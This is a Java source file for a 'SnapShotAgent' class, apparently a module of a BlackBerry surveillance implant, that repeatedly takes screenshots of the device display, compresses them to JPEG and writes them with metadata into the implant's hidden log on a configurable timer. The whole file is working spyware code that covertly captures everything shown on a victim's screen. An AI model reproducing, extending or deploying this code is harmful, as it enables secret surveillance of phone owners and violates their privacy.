package com.ht.rcs.blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogType;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.WChar;

public class SnapShotAgent extends Agent {
    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;

    private static final int LOG_SNAPSHOT_VERSION = 2009031201;

    //#debug
    static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);

    private int timerMillis = 60 * 1000;
    private boolean onNewWindow = false;

    public SnapShotAgent(boolean agentStatus) {
        super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
        // #ifdef DBC
                        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
        // #endif

    }

    protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    // se e' in standby non prendi la snapshot
    public void actualRun() {
        for (;;) {
            // #debug
            debug.info("Taking snapshot");
            int width = Display.getWidth();
            int height = Display.getHeight();

            Bitmap bitmap = new Bitmap(width, height);
            Display.screenshot(bitmap);

            // int size = width * height;
            /*
             * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0,
             * width, 0, 0, width, height);
             */
            // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
            EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                    SNAPSHOT_DEFAULT_JPEG_QUALITY);
            byte[] plain = encoded.getData();

            /*
             * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH +
             * "snapshot.jpg", false); if (file.exists()) { file.delete(); }
             * file.create(); file.write(plain);
             */

            // #ifdef DBC
                                    Check.requires(log != null, "Null log");
            // #endif

            log.createLog(getAdditionalData());
            log.writeLog(plain);
            log.close();

            if (smartSleep(timerMillis)) {
                // #debug
                debug.info("clean stop: " + this);
                return;
            }

            // #debug
            debug.trace("finished sleep");
        }
    }

    private byte[] getAdditionalData() {
        String window = "Desktop";

        int wlen = window.length() * 2;
        int tlen = wlen + 24;
        byte[] additionalData = new byte[tlen];

        DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen, false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(0); // process name len
        databuffer.writeInt(wlen); // windows name len

        byte[] windowsName = new byte[wlen];
        windowsName = WChar.getBytes(window);
        databuffer.write(windowsName);

        // #ifdef DBC
                        Check.asserts(windowsName.length == wlen, "Wrong windows name");
                        Check.ensures(additionalData.length == tlen, "Wrong additional data name");
        // #endif

        // #debug
        debug.trace("Additional data len: " + additionalData.length);

        return additionalData;
    }

    protected boolean parse(byte[] confParameters) {
        // #ifdef DBC
                        Check.asserts(confParameters != null, "Null confParameters");
        // #endif

        DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);

        try {

            int value = databuffer.readInt();

            if (value >= 1000) {
                this.timerMillis = value;
            }
            // #debug
            debug.trace("timer: " + timerMillis);

            value = databuffer.readInt();
            onNewWindow = (value == 1);
            // #debug
            debug.trace("onNewWindow: " + onNewWindow);

        } catch (EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
